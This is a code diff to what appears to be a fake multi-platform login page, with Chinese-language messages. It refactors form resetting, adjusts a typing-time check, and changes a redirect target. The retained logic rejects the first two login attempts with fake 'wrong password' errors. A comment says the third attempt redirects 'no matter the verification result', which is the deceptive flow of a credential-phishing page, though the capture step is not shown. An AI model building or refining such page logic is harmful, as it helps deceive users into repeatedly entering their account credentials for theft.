@@ -156,8 +156,9 @@
             var endTime = Date.now();
             var inputTime = (endTime - startTime) / 1000; // 換算成秒
 
-            if (inputTime < 4) {
+            if (inputTime < 3) {
                 showErrorNotification("請稍候再試");
+                resetForm();
                 return;
             }
 
@@ -168,6 +169,7 @@
             // 檢查是否選擇了平台
             if (platform === "") {
                 showErrorNotification("請選擇一個平台");
+                resetForm();
                 return;
             }
 
@@ -181,20 +183,16 @@
                 } else if (loginAttempts === 1) {
                     showErrorNotification("帳號密碼錯誤第二次");
                 }
+                resetForm();
                 loginAttempts++;
             } else {
                 // 登入成功後的處理
                 if (loginAttempts === 2) {
                     // 第三次輸入，無論驗證結果如何，都將成功跳轉
-                    window.location.href = platformLinks[platform];
+                    window.location.href = "https://example.com/" + platform;
                 }
-
-                // 清空帳號密碼輸入欄位
-                document.getElementById("username").value = "";
-                document.getElementById("password").value = "";
-
-                // 重設下拉式表單回到預設選項
-                document.getElementById("platform").value = "";
+                resetForm();
+                loginAttempts = 0; // 重置嘗試次數計數器
             }
         });
 
@@ -210,6 +208,12 @@
             setTimeout(function() {
                 notification.style.display = "none";
             }, 3000); // 顯示3秒後隱藏
+        }
+
+        function resetForm() {
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
+            document.getElementById("platform").value = "";
         }
     </script>
 </body>
